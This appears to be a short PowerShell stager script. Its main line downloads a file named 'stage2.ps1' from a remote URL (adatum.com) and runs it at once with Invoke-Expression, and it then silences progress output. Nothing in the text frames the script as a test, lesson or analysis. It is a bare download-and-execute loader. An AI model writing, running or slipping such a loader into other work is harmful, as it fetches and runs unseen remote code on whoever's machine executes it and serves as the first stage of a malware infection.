
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://adatum.com:80/stage2.ps1',
    [int]$StageTimeout = 41
)
IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing).Content
$ProgressPreference = "SilentlyContinue"
